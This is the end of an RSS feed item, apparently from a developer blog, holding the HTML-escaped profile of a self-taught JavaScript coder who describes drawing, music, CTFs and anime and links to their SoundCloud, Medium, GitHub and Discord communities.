&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Author: Yuma-Tsushima07&lt;/p&gt;

</description>
      <category>security</category>
      <category>programming</category>
      <category>python</category>
      <category>java</category>
    </item>
  </channel>
</rss>
